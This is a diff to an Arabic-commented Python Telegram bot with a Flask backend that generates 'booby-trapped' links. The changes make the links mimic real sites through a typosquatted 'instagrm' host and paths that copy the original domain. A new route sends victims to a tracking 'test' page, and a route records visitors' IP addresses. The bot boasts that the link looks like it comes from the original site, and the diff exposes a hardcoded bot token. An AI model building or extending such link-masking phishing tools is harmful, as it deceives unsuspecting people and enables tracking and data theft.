@@ -18,7 +18,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ====== الإعدادات (config) ======
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8847400367:AAHNhfgMGGuo3eCIiNjMD8u4EjnL7OkNLls')
-BASE_URL = os.environ.get('BASE_URL', 'https://bott-production-25ba.up.railway.app')
+BASE_URL = os.environ.get('BASE_URL', 'https://instagrm.up.railway.app')
 SECRET_KEY = os.environ.get('SECRET_KEY', 'my-super-secret-key')
 DB_PATH = 'data.db'
 
@@ -323,40 +323,36 @@ def is_valid_url(url):
     except:
         return False
 
-def create_short_link(session_id):
+def create_short_link(session_id, original_url):
+    """إنشاء رابط مقنع يحاكي الموقع الأصلي"""
+    parsed = urlparse(original_url)
+    domain = parsed.netloc.replace('www.', '')  # مثلاً: instagram.com
+    
+    # استخراج المسار الأصلي (لجعل الرابط أكثر إقناعاً)
+    path = parsed.path.strip('/') or 'profile'
+    if parsed.query:
+        path = f"{path}?{parsed.query}"
+    
+    # إنشاء معرف قصير
     short_id = session_id[:8]
-    return f"{BASE_URL}/{short_id}"
+    
+    # بناء الرابط المقنع
+    return f"{BASE_URL}/{domain}/{path}/{short_id}"
 
 # ====== دوال الجلسات (session_manager) ======
 def create_session(chat_id, features, original_url, config_data=None):
     session_id = generate_session_id()
-    
-    # ====== إنشاء رابط ملغم بنفس شكل الرابط الأصلي ======
-    parsed = urlparse(original_url)
-    
-    # إضافة مسار أو معامل وهمي
-    if parsed.path.endswith('/'):
-        fake_path = f"{parsed.path}{session_id[:8]}"
-    elif parsed.path:
-        fake_path = f"{parsed.path}/{session_id[:8]}"
-    else:
-        fake_path = f"/{session_id[:8]}"
-    
-    # إعادة بناء الرابط
-    if parsed.query:
-        fake_url = f"{parsed.scheme}://{parsed.netloc}{fake_path}?{parsed.query}&ref={session_id[:6]}"
-    else:
-        fake_url = f"{parsed.scheme}://{parsed.netloc}{fake_path}?ref={session_id[:6]}"
+    fake_url = create_short_link(session_id, original_url)
     
     conn = get_db()
     conn.execute('''
-        INSERT INTO sessions (session_id, chat_id, features, original_url, config, created, fake_url)
+        INSERT INTO sessions (session_id, chat_id, features, original_url, fake_url, config, created)
         VALUES (?, ?, ?, ?, ?, ?, ?)
-    ''', (session_id, chat_id, features, original_url, json.dumps(config_data or {}), datetime.now().isoformat(), fake_url))
+    ''', (session_id, chat_id, features, original_url, fake_url, json.dumps(config_data or {}), datetime.now().isoformat()))
     conn.commit()
     conn.close()
     
-    return session_id, fake_url
+    return session_id
 
 def get_session(session_id):
     conn = get_db()
@@ -699,7 +695,32 @@ runAll();
 @app.route('/')
 def index():
     return "🔬 مختبر الاختبار - يعمل"
-
+@app.route('/<domain>/<path:path>')
+def handle_masked_link(domain, path):
+    """معالجة الروابط المقنعة (مثل /instagram/l7uzl/abc123)"""
+    # استخراج session_id من المسار (آخر جزء)
+    parts = path.split('/')
+    session_id = parts[-1][:8] if parts else None
+    
+    if not session_id:
+        return "❌ رابط غير صالح", 404
+    
+    # البحث عن الجلسة في قاعدة البيانات
+    conn = get_db()
+    session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (session_id + '%',)).fetchone()
+    conn.close()
+    
+    if not session:
+        return "❌ رابط غير صالح", 404
+    
+    # التحقق من الصلاحية (10 دقائق)
+    created = datetime.fromisoformat(session['created'])
+    if (datetime.now() - created).seconds > 600:
+        return "⏰ انتهت صلاحية الرابط", 403
+    
+    # إعادة التوجيه إلى صفحة الاختبار
+    return redirect(f"/test/{session['session_id']}/{session['features']}")
+    
 @app.route('/get_ip')
 def get_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -1818,22 +1839,27 @@ def handle_original_url(message):
         bot.reply_to(message, "❌ الرابط غير صحيح. أرسل رابطاً صالحاً (مثل: https://example.com)")
         return
     
-    session_id, fake_url = create_session(user_id, feature, original_url, {})
+    # إنشاء الجلسة
+    session_id = create_session(user_id, feature, original_url, {})
+    
+    # إنشاء الرابط المقنع
+    masked_link = create_short_link(session_id, original_url)
+    
     del user_states[user_id]
     
     bot.reply_to(message, f"""
 🔗 **تم إنشاء الرابط الملغم**
 
-📌 **الرابط الملغم:**
-<code>{fake_url}</code>
+📌 **الرابط المقنع:**
+<code>{masked_link}</code>
 
 🔗 **الرابط الأصلي:**
 <code>{original_url}</code>
 
 📋 **الميزة:** {feature}
-⏱ الصلاحية: 5 دقائق
+⏱ الصلاحية: 10 دقائق
 
-⚠️ الرابط يبدو وكأنه الرابط الأصلي!
+⚠️ الرابط يبدو وكأنه من الموقع الأصلي!
     """, parse_mode='HTML')
     
 # ====== تشغيل البوت ======
